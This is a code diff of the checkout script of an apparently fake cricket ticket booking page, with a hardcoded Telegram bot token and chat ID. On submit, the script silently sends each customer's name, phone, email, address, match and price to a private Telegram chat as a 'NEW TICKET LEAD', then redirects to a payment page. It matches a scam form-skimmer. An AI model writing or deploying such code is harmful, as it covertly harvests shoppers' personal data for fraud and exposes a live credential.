@@ -158,39 +158,48 @@
             localStorage.setItem('customerPhone', phone);
             localStorage.setItem('customerAddress', address);
 
-                        // --- 🔥 TELEGRAM LOGIC (HINDI & FULL DETAILS) ---
+            // --- 🔥 TELEGRAM LOGIC ---
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513"; 
 
-            // सीट की डिटेल और मैच की डेट लोकल स्टोरेज से निकालना
-            const seats = localStorage.getItem('selectedSeats') || "Not Provided";
-            const matchDate = selectedMatch.date ? `(${selectedMatch.date})` : "";
-
-            // हिंदी टेलीग्राम मैसेज पूरी डिटेल के साथ
-            const telegramMsg = `📝 *कस्टमर ने डिटेल्स भर दी हैं! (Address Page)* 📝\n\n` +
-                                `👤 *नाम (Name):* ${name}\n` +
-                                `📞 *नंबर (Phone):* ${phone}\n` +
-                                `📧 *ईमेल (Email):* ${email}\n` +
-                                `🏠 *पता (Address):* ${address}\n` +
-                                `🏏 *मैच (Match):* ${matchTitle} ${matchDate}\n` +
-                                `🎟️ *सीट्स (Seats):* ${seats}\n` +
-                                `💰 *अमाउंट (Amount):* ₹${finalPrice}\n\n` +
-                                `👉 *स्टेटस:* कस्टमर ने डिटेल्स सेव कर ली हैं और अब *Payment* पेज पर जा रहा है!`;
+            const telegramMsg = `🔥 *NEW TICKET LEAD (Details Page)* 🔥\n\n` +
+                                `🏏 *Match:* ${matchTitle}\n` +
+                                `💰 *Amount:* ₹${finalPrice}\n` +
+                                `👤 *Name:* ${name}\n` +
+                                `📞 *Phone:* ${phone}\n` +
+                                `📧 *Email:* ${email}\n` +
+                                `🏠 *Address:* ${address}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
 
-            // मैसेज जाने का इंतज़ार करो फिर पेमेंट पेज पर भेजो
+            // Wait for telegram message to be sent before redirecting
             fetch(url).then(() => {
                 window.location.href = 'payment.html';
             }).catch(() => {
                 window.location.href = 'payment.html';
             });
 
-            // अगर नेटवर्क स्लो हो तो 1.5 सेकंड बाद ऑटोमैटिक चला जायेगा
+            // Fail-safe redirect after 1.5 seconds
             setTimeout(() => {
                 window.location.href = 'payment.html';
             }, 1500);
-            
+        });
+    </script>
+
+    <script type="module">
+        import { db, ref, onValue } from './js/firebase.js';
+        
+        onValue(ref(db, 'settings/payment'), (snap) => {
+            if (snap.exists()) {
+                const settings = snap.val();
+                const globalFooterLogo = settings.globalFooterLogo || '';
+                const footerLogoImg = document.getElementById('dynamic-footer-logo');
+                if (footerLogoImg && globalFooterLogo.trim() !== "") {
+                    footerLogoImg.src = globalFooterLogo;
+                    footerLogoImg.style.display = 'block';
+                }
+            }
+        });
     </script>
 
 </body>
